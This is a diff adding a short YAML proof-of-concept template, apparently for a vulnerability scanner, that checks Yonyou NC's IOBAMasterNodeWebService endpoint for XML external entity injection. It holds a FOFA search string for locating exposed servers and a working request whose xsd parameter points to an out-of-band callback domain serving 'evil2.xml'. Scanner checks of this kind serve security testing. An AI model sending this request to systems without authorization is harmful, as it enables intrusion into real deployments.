@@ -1,0 +1,19 @@
+id: poc-yaml-yongyou-iobamasternodewebservice-xxe
+info:
+  name: 用友NC IOBAMasterNodeWebService接口存在xml外部实体注入漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: GET
+  path: /uapws/service/nc.itf.tb.oba.IOBAMasterNodeWebService?xsd=http://{{.reverseDomain}}./evil2.xml
+  expression: 'reverse.Verify()
+
+    '
+transport: http
